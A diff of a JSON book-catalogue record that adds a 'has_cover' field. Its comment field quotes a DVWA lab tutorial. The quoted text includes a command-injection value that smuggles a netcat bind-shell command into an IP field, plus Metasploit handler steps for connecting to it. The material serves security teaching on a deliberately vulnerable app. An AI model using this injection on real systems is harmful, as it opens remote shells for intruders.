@@ -39,6 +39,7 @@
   ],
   "cover_url": "/cover_thumb/10288?v=1795436626",
   "cover_og_url": "/cover/10288/og?v=1795436626",
+  "has_cover": false,
   "url": "/book/dvwa-serangan-menggunakan-metasploit-onno-widodo-purbo/",
   "rating": null,
   "comment": "Web DVWA Masuk ke Command Execution Isi dengan 192.168.1.106;mkfifo /tmp/pipe;sh /tmp/pipe | nc -l 4444 &gt; /tmp/pipe Dari Kali Linux Gunakan Backtrack / Kali Linux. Applications --&gt; BackTrack --&gt; Exploitation Tools --&gt; Network Exploitation Tools --&gt; Metasploit Framework --&gt; msfconsole. use multi/handler set PAYLOAD linux/x86/shell/bind_tcp show options set RHOST 192.168.0.80 192.168.0.80 is the IP",
